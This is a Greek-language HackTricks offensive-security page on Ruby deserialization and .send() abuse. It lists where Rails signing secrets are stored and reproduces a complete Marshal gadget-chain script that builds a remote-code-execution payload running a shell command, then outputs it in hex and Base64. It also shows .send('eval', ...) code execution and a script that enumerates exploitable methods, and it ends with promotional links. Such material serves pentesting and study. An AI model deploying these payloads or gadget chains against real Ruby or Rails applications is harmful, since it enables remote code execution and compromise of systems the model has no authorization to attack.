Στη Ruby, η σειριοποίηση διευκολύνεται από δύο μεθόδους εντός της βιβλιοθήκης **marshal**. Η πρώτη μέθοδος, γνωστή ως **dump**, χρησιμοποιείται για να μετατρέψει ένα αντικείμενο σε ροή bytes. Αυτή η διαδικασία αναφέρεται ως σειριοποίηση. Αντίστροφα, η δεύτερη μέθοδος, **load**, χρησιμοποιείται για να επαναφέρει μια ροή bytes σε ένα αντικείμενο, μια διαδικασία γνωστή ως αποσειριοποίηση.

Για την ασφάλεια των σειριοποιημένων αντικειμένων, η **Ruby χρησιμοποιεί το HMAC (Hash-Based Message Authentication Code)**, εξασφαλίζοντας την ακεραιότητα και την αυθεντικότητα των δεδομένων. Το κλειδί που χρησιμοποιείται για αυτόν τον σκοπό αποθηκεύεται σε μία από τις πιθανές τοποθεσίες:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Αλυσίδα γκατζετ σειριοποίησης Ruby 2.X για RCE (περισσότερες πληροφορίες στο** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Άλλη αλυσίδα RCE για εκμετάλλευση του Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Η μέθοδος Ruby .send()

Όπως εξηγείται στην [**αυτήν την αναφορά ευπαθειών**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), εάν κάποια μη αποστειρωμένη είσοδος φτάσει στη μέθοδο `.send()` ενός αντικειμένου Ruby, αυτή η μέθοδος επιτρέπει να **καλείται οποιαδήποτε άλλη μέθοδος** του αντικειμένου με οποιεσδήποτε παραμέτρους.

Για παράδειγμα, η κλήση της eval και στη συνέχεια κώδικα Ruby ως δεύτερη παράμετρος θα επιτρέψει την εκτέλεση αυθαίρετου κώδικα:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

Επιπλέον, αν μόνο ένα παράμετρος της **`.send()`** ελέγχεται από έναν επιτιθέμενο, όπως αναφέρθηκε στο προηγούμενο κείμενο, είναι δυνατόν να κληθεί οποιαδήποτε μέθοδος του αντικειμένου που **δεν χρειάζεται ορίσματα** ή των οποίων τα ορίσματα έχουν **προεπιλεγμένες τιμές**.\
Για αυτό, είναι δυνατόν να απαριθμηθούν όλες οι μέθοδοι του αντικειμένου για να **βρεθούν μερικές ενδιαφέρουσες μέθοδοι που πληρούν αυτές τις απαιτήσεις**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
